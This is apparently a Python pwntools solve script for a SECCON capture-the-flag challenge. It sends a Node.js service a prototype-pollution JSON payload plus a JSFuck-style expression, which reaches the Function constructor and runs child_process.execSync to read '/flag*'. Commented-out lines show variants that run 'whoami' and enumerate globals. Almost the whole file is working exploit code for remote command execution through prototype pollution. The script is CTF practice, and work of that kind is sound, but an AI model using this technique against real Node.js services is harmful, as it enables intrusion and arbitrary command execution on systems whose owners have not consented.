# ref. https://zenn.dev/tchen/articles/5c446d9dbd9920
# ref. https://qiita.com/shimgo2008/items/b7421974a1aab8131b43
# ref. https://stackoverflow.com/questions/63673610/alternative-way-to-get-c-letter-in-jsfuck

from pwn import *
import json

# []["filter"]["constructor"]('return require('child_process').execSync('whoami').toString()')()
# io = process(["node", "index.js"])
# io = process(["node", "index.mod.js"])
io = remote("pp4.seccon.games", 5000)

# proto_poll = '{ "__proto__": { "[": "constructor" } }'
# proto_poll = """{ "__proto__": {"undefined": "constructor", "function Array() { [native code] }": "  return [...Object.getOwnPropertyNames(globalThis)].slice(50) " }}"""
# proto_poll = """{ "__proto__": {"undefined": "constructor", "function Array() { [native code] }": "  return Object.getOwnPropertyNames(process.mainModule) " }}"""
proto_poll = """{ "__proto__": {"undefined": "constructor", "function Array() { [native code] }": "return process.mainModule.require('child_process').execSync('cat /flag*').toString();" }}"""
constructor = "[][[][[]]]"
exploit_code = "[][[][[][[][[]]]]]"

exploit = f"[][{constructor}][{constructor}]({exploit_code})()"
# exploit = constructor
# exploit = f"require"


io.sendlineafter(b":", proto_poll)
io.sendlineafter(b":", exploit)
io.interactive()
